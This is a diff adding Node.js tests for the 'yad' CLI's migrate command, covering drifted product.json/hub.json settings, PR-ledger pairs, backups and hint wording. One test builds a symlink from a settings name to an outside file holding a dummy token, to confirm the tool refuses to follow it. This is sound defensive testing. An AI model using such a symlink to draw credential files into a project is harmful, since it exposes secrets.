+    assert.equal(m.status, 0, m.stderr);
+    const mj = JSON.parse(m.stdout);
+    assert.deepEqual(mj.drift.map((x) => [x.canonical, x.legacy, x.differences]), [['.sdlc/product.json', '.sdlc/hub.json', ['`platform` differs']]]);
+    assert.equal(mj.kept, null);
+    // The preview names both names of the pair: which one the apply rewrites is the person's choice.
+    assert.ok(['.sdlc/product.json', '.sdlc/hub.json'].every((f) => mj.changed.includes(f)), JSON.stringify(mj.changed));
+    // An epic's PR ledger that drifts is refused the same way, once the settings agree.
+    fs.writeFileSync(path.join(T, '.sdlc/hub.json'), fs.readFileSync(path.join(T, '.sdlc/product.json')));
+    fs.mkdirSync(path.join(T, 'epics/EP-x/.sdlc'), { recursive: true });
+    fs.writeFileSync(path.join(T, 'epics/EP-x/.sdlc/state.json'), JSON.stringify({ epicId: 'EP-x', currentStep: 'epic', steps: [{ id: 'epic', type: 'author', artifact: 'epic.md', status: 'in_progress' }] }));
+    fs.writeFileSync(path.join(T, 'epics/EP-x/.sdlc/product-prs.json'), '[]\n');
+    fs.writeFileSync(path.join(T, 'epics/EP-x/.sdlc/hub-prs.json'), '[{"artifact":"epic.md"}]\n');
+    const e = yad('next', 'EP-x', '--json');
+    assert.equal(e.status, 1);
+    assert.match(JSON.parse(e.stdout).error, /epics\/EP-x\/\.sdlc\/product-prs\.json and epics\/EP-x\/\.sdlc\/hub-prs\.json say different things/);
+    // `--keep product` ends it; the command then runs.
+    const k = yad('migrate', '--apply', '--keep', 'product', '--json');
+    assert.equal(k.status, 0, k.stdout + k.stderr);
+    assert.equal(JSON.parse(k.stdout).kept, 'product');
+    assert.equal(fs.readFileSync(path.join(T, 'epics/EP-x/.sdlc/hub-prs.json'), 'utf8'), '[]\n');
+    assert.equal(fs.readFileSync(path.join(T, 'epics/EP-x/.sdlc/hub-prs.json.yad-orig'), 'utf8'), '[{"artifact":"epic.md"}]\n', 'the copy not kept is backed up');
+    const after = yad('next', '--json');
+    assert.equal(after.status, 0, after.stdout + after.stderr);
+  } finally { fs.rmSync(T, { recursive: true, force: true }); }
+});
+
+test('E122: yad migrate --apply asks which copy to keep, refuses without an answer, and writes nothing then', async () => {
+  const { runMigrate } = await import('./migrate.mjs');
+  const drifted = () => {
+    const T = fs.mkdtempSync(path.join(os.tmpdir(), 'sdlc-e122m-'));
+    fs.mkdirSync(path.join(T, '.sdlc'));
+    fs.writeFileSync(path.join(T, '.sdlc/product.json'), '{"schemaVersion":10,"platform":"gitlab"}\n');
+    fs.writeFileSync(path.join(T, '.sdlc/hub.json'), '{"schemaVersion":10,"platform":"github"}\n');
+    return T;
+  };
+  const both = (T) => ['product.json', 'hub.json'].map((f) => JSON.parse(fs.readFileSync(path.join(T, '.sdlc', f), 'utf8')).platform);
+  // The person answers.
+  let T = drifted();
+  try {
+    let asked = '';
+    await captureConsole(() => runMigrate(T, { apply: true }, { choose: (q) => { asked = q; return 'hub'; } }));
+    assert.match(asked, /keep which: product \(the new name\) or hub \(the old name\)/);
+    assert.deepEqual(both(T), ['github', 'github']);
+  } finally { fs.rmSync(T, { recursive: true, force: true }); }
+  // No answer, a wrong answer, a --json run with no --keep, a --keep that is not a choice: nothing written.
+  for (const [opts, extra, code, msg] of [
+    [{ apply: true }, { choose: () => '' }, 'YAD-STATE-008', /stopped — nothing was written/],
+    [{ apply: true }, { choose: () => 'both' }, 'YAD-STATE-008', /"both" is not product or hub/],
+    [{ apply: true, json: true }, {}, 'YAD-CLI-001', /a --json run cannot ask which copy to keep/],
+    [{ apply: true, keep: 'new' }, {}, 'YAD-STATE-008', /--keep takes product or hub, not "new"/],
+  ]) {
+    T = drifted();
+    try {
+      await assert.rejects(() => runMigrate(T, opts, extra), (e) => e.code === code && msg.test(e.message) && /--keep/.test(e.hint));
+      assert.deepEqual(both(T), ['gitlab', 'github'], `${msg}: nothing written`);
+      assert.ok(!fs.existsSync(path.join(T, '.sdlc/product.json.yad-orig')) && !fs.existsSync(path.join(T, '.sdlc/hub.json.yad-orig')), `${msg}: no backup either`);
+    } finally { fs.rmSync(T, { recursive: true, force: true }); }
+  }
+});
+
+test('E122: the ledger hook guards a drifted pair when EITHER copy is verified, and says why', () => {
+  const T = hookProduct({ hub: { platform: 'gitlab', ledger: 'local', default_branch: 'main' } });
+  try {
+    fs.writeFileSync(path.join(T, '.sdlc/product.json'), JSON.stringify({ platform: 'gitlab', ledger: 'local', default_branch: 'main' }));
+    assert.equal(decide(T, 'epics/EP-seeded/.sdlc/state.json').allow, true, 'both local: nothing to guard');
+    // The new name says local, the old one verified: guarded, never disarmed by the drift.
+    fs.writeFileSync(path.join(T, '.sdlc/hub.json'), JSON.stringify({ platform: 'gitlab', ledger: 'verified', default_branch: 'main' }));
+    let v = decide(T, 'epics/EP-seeded/.sdlc/state.json');
+    assert.equal(v.allow, false);
+    assert.match(v.message, /product\.json and \.sdlc\/hub\.json say different things, and one of them is verified, so this edit is guarded — run `yad migrate`/);
+    // The other way round too.
+    fs.writeFileSync(path.join(T, '.sdlc/product.json'), JSON.stringify({ platform: 'gitlab', ledger: 'verified', default_branch: 'main' }));
+    fs.writeFileSync(path.join(T, '.sdlc/hub.json'), JSON.stringify({ platform: 'gitlab', ledger: 'local', default_branch: 'main' }));
+    v = decide(T, 'epics/EP-seeded/.sdlc/state.json');
+    assert.equal(v.allow, false);
+    // No drift, new name verified, old one gone: guarded from product.json alone.
+    fs.rmSync(path.join(T, '.sdlc/hub.json'));
+    v = decide(T, 'epics/EP-seeded/.sdlc/state.json');
+    assert.equal(v.allow, false);
+    assert.doesNotMatch(v.message, /say different things/);
+  } finally { fs.rmSync(T, { recursive: true, force: true }); }
+});
+
+test('E122: doctor names the settings file it actually read — product.json when it exists', async () => {
+  const T = fs.mkdtempSync(path.join(os.tmpdir(), 'sdlc-e122doc-'));
+  try {
+    fs.mkdirSync(path.join(T, '.sdlc'));
+    const bad = '{"platform":"githbu"}\n';
+    fs.writeFileSync(path.join(T, '.sdlc/product.json'), bad);
+    fs.writeFileSync(path.join(T, '.sdlc/hub.json'), bad);
+    let r = await doctorOn(T);
+    let c = r.checks.find((x) => x.id === 'hub');
+    assert.match(c.message, /^\.sdlc\/product\.json: unknown platform/, 'the file to fix is the one read');
+    // An older Product with only the old name: that one is named.
+    fs.rmSync(path.join(T, '.sdlc/product.json'));
+    r = await doctorOn(T);
+    c = r.checks.find((x) => x.id === 'hub');
+    assert.match(c.message, /^\.sdlc\/hub\.json: unknown platform/);
+  } finally { fs.rmSync(T, { recursive: true, force: true }); }
+});
+
+test('E122: on a verified Product, settling an epic\'s PR-ledger pair says how to commit the CI-owned repair', async () => {
+  const { runMigrate } = await import('./migrate.mjs');
+  const T = fs.mkdtempSync(path.join(os.tmpdir(), 'sdlc-e122v-'));
+  try {
+    fs.mkdirSync(path.join(T, '.sdlc'));
+    const cfg = '{"schemaVersion":10,"platform":"github","git_url":"https://github.com/a/b","ledger":"verified"}\n';
+    fs.writeFileSync(path.join(T, '.sdlc/product.json'), cfg);
+    fs.writeFileSync(path.join(T, '.sdlc/hub.json'), cfg);
+    fs.mkdirSync(path.join(T, 'epics/EP-x/.sdlc'), { recursive: true });
+    fs.writeFileSync(path.join(T, 'epics/EP-x/.sdlc/product-prs.json'), '[]\n');
+    fs.writeFileSync(path.join(T, 'epics/EP-x/.sdlc/hub-prs.json'), '[{"artifact":"epic.md"}]\n');
+    const said = [];
+    const origErr = console.error;
+    console.error = (...a) => said.push(a.map(String).join(' '));
+    let out;
+    try { ({ out } = await captureConsole(() => runMigrate(T, { apply: true, keep: 'product' }))); } finally { console.error = origErr; }
+    const all = `${out}\n${said.join('\n')}`;
+    assert.match(all, /epics\/EP-x\/\.sdlc\/hub-prs\.json is CI-owned on this verified Product/);
+    assert.match(all, /yad commit --manual --reason/);
+    assert.equal(fs.readFileSync(path.join(T, 'epics/EP-x/.sdlc/hub-prs.json'), 'utf8'), '[]\n', 'the repair is still made');
+  } finally { fs.rmSync(T, { recursive: true, force: true }); }
+});
+
+test('E122: migrate settles nothing when one kept copy is broken, and never settles through a symlink', async () => {
+  const { runMigrate } = await import('./migrate.mjs');
+  const make = () => {
+    const T = fs.mkdtempSync(path.join(os.tmpdir(), 'sdlc-e122s-'));
+    fs.mkdirSync(path.join(T, '.sdlc'));
+    fs.writeFileSync(path.join(T, '.sdlc/product.json'), '{"schemaVersion":10,"platform":"gitlab"}\n');
+    fs.writeFileSync(path.join(T, '.sdlc/hub.json'), '{"schemaVersion":10,"platform":"github"}\n');
+    fs.mkdirSync(path.join(T, 'epics/EP-x/.sdlc'), { recursive: true });
+    fs.writeFileSync(path.join(T, 'epics/EP-x/.sdlc/product-prs.json'), '[]\n');
+    return T;
+  };
+  const snap = (T) => ['.sdlc/product.json', '.sdlc/hub.json'].map((f) => fs.readFileSync(path.join(T, f), 'utf8'));
+  // The PR pair's kept copy (hub-prs.json) does not parse: the settings pair, settled first, is not touched.
+  let T = make();
+  try {
+    fs.writeFileSync(path.join(T, 'epics/EP-x/.sdlc/hub-prs.json'), '[ nope\n');
+    const before = snap(T);
+    await assert.rejects(() => runMigrate(T, { apply: true, keep: 'hub' }), (e) => e.code === 'YAD-STATE-001' && /hub-prs\.json does not parse.*nothing was written/.test(e.message));
+    assert.deepEqual(snap(T), before, 'no pair half-settled');
+    assert.ok(!fs.existsSync(path.join(T, '.sdlc/product.json.yad-orig')));
+    assert.ok(!fs.existsSync(path.join(T, '.gitignore')), 'nor .gitignore: a refusal changes nothing');
+  } finally { fs.rmSync(T, { recursive: true, force: true }); }
+  // A name that is a link: refused, whichever copy is kept, and the file it points at is never read into the Product.
+  T = make();
+  const outside = fs.mkdtempSync(path.join(os.tmpdir(), 'sdlc-e122o-'));
+  try {
+    fs.writeFileSync(path.join(T, 'epics/EP-x/.sdlc/hub-prs.json'), '[]\n');
+    fs.writeFileSync(path.join(outside, 'secret.json'), '{"token":"s3cret"}\n');
+    fs.rmSync(path.join(T, '.sdlc/hub.json'));
+    fs.symlinkSync(path.join(outside, 'secret.json'), path.join(T, '.sdlc/hub.json'));
+    for (const keep of ['hub', 'product']) {
+      await assert.rejects(() => runMigrate(T, { apply: true, keep }), (e) => e.code === 'YAD-STATE-008' && /\.sdlc\/hub\.json is a symbolic link/.test(e.message), keep);
+    }
+    assert.equal(fs.readFileSync(path.join(T, '.sdlc/product.json'), 'utf8'), '{"schemaVersion":10,"platform":"gitlab"}\n');
+    assert.equal(fs.readFileSync(path.join(outside, 'secret.json'), 'utf8'), '{"token":"s3cret"}\n', 'the link target is untouched');
+  } finally { fs.rmSync(T, { recursive: true, force: true }); fs.rmSync(outside, { recursive: true, force: true }); }
+  // A name deleted while the question waited: refused as a changed pair, not a raw ENOENT.
+  T = make();
+  try {
+    fs.writeFileSync(path.join(T, 'epics/EP-x/.sdlc/hub-prs.json'), '[]\n');
+    const choose = () => { fs.rmSync(path.join(T, '.sdlc/hub.json')); return 'product'; };
+    await assert.rejects(() => runMigrate(T, { apply: true }, { choose }), (e) => e.code === 'YAD-STATE-008' && /\.sdlc\/hub\.json is gone since the difference was found — nothing was written/.test(e.message));
+  } finally { fs.rmSync(T, { recursive: true, force: true }); }
+  // A name edited while the question waited: not the pair the person chose for.
+  T = make();
+  try {
+    fs.writeFileSync(path.join(T, 'epics/EP-x/.sdlc/hub-prs.json'), '[]\n');
+    const choose = () => { fs.writeFileSync(path.join(T, '.sdlc/hub.json'), '{"schemaVersion":10,"platform":null}\n'); return 'product'; };
+    await assert.rejects(() => runMigrate(T, { apply: true }, { choose }), (e) => e.code === 'YAD-STATE-008' && /changed since the difference was shown — nothing was written/.test(e.message));
+    assert.equal(fs.readFileSync(path.join(T, '.sdlc/hub.json'), 'utf8'), '{"schemaVersion":10,"platform":null}\n', 'the edit is left alone');
+    assert.ok(!fs.existsSync(path.join(T, '.gitignore')));
+  } finally { fs.rmSync(T, { recursive: true, force: true }); }
+  // A name that is a folder: refused before anything is written.
+  T = make();
+  try {
+    fs.writeFileSync(path.join(T, 'epics/EP-x/.sdlc/hub-prs.json'), '[]\n');
+    fs.rmSync(path.join(T, '.sdlc/hub.json'));
+    fs.mkdirSync(path.join(T, '.sdlc/hub.json'));
+    await assert.rejects(() => runMigrate(T, { apply: true, keep: 'product' }), (e) => e.code === 'YAD-STATE-008' && /\.sdlc\/hub\.json is not a file — nothing was written/.test(e.message));
+    assert.ok(!fs.existsSync(path.join(T, '.gitignore')));
+  } finally { fs.rmSync(T, { recursive: true, force: true }); }
+});
+
+test('E122: a settings hint names the file that is read, and the migrate step only when both names exist', async () => {
+  const { settingsEditHint } = await import('./manifest.mjs');
+  const T = fs.mkdtempSync(path.join(os.tmpdir(), 'sdlc-e122h-'));
+  try {
+    fs.mkdirSync(path.join(T, '.sdlc'));
+    fs.writeFileSync(path.join(T, '.sdlc/hub.json'), '{"platform":"github"}\n');
+    // An older Product: edit hub.json, and nothing else — a product.json made by hand beside it would be
+    // copied over every other setting by `--keep product`.
+    assert.equal(settingsEditHint(T), '.sdlc/hub.json');
+    let r = await doctorOn(T);
+    assert.match(r.checks.find((c) => c.id === 'hub-git-url').hint, /^add git_url to \.sdlc\/hub\.json \(or re-run/);
+    fs.writeFileSync(path.join(T, '.sdlc/product.json'), '{"platform":"github"}\n');
+    assert.equal(settingsEditHint(T), '.sdlc/product.json, then `yad migrate --apply --keep product`');
+    r = await doctorOn(T);
+    assert.match(r.checks.find((c) => c.id === 'hub-git-url').hint, /^add git_url to \.sdlc\/product\.json, then `yad migrate --apply --keep product`/);
+    fs.rmSync(path.join(T, '.sdlc/hub.json'));
+    assert.equal(settingsEditHint(T), '.sdlc/product.json');
+  } finally { fs.rmSync(T, { recursive: true, force: true }); }
+});
+
+test('E122: the default-branch guard names the settings file to edit — hub.json on a Product that has only it', async () => {
+  const { guardDefaultBranch } = await import('./hubcommit.mjs');
+  const T = fs.mkdtempSync(path.join(os.tmpdir(), 'sdlc-e122g-'));
+  const code = process.exitCode;
+  try {
+    fs.mkdirSync(path.join(T, '.sdlc'));
+    fs.writeFileSync(path.join(T, '.sdlc/hub.json'), '{}\n');
+    let r = await captureConsole(() => guardDefaultBranch('feat/x', 'main', { root: T, cmd: 'yad tidy up' }));
+    assert.equal(r.value, false);
+    assert.match(r.out, /if 'main' is wrong, set default_branch in \.sdlc\/hub\.json\)/);
+    fs.writeFileSync(path.join(T, '.sdlc/product.json'), '{}\n');
+    r = await captureConsole(() => guardDefaultBranch('feat/x', 'main', { root: T, cmd: 'yad tidy up' }));
+    assert.match(r.out, /set default_branch in \.sdlc\/product\.json, then `yad migrate --apply --keep product`\)/);
+  } finally { process.exitCode = code; fs.rmSync(T, { recursive: true, force: true }); }
+});
+
+test('E122: every caller of the default-branch guard hands it the Product root', () => {
+  // Without `root` the hint falls back to the words-only version; nothing else would notice.
+  const callers = ['checkpoint.mjs', 'gate.mjs', 'repo-publish.mjs', 'tidy.mjs'];
+  for (const f of callers) {
+    const calls = fs.readFileSync(path.join(ROOT, 'cli', f), 'utf8').match(/guardDefaultBranch\([^)]*\)/g) || [];
+    assert.ok(calls.length, `${f} calls the guard`);
+    for (const c of calls) assert.match(c, /\broot\b/, `${f}: ${c}`);
+  }
 });
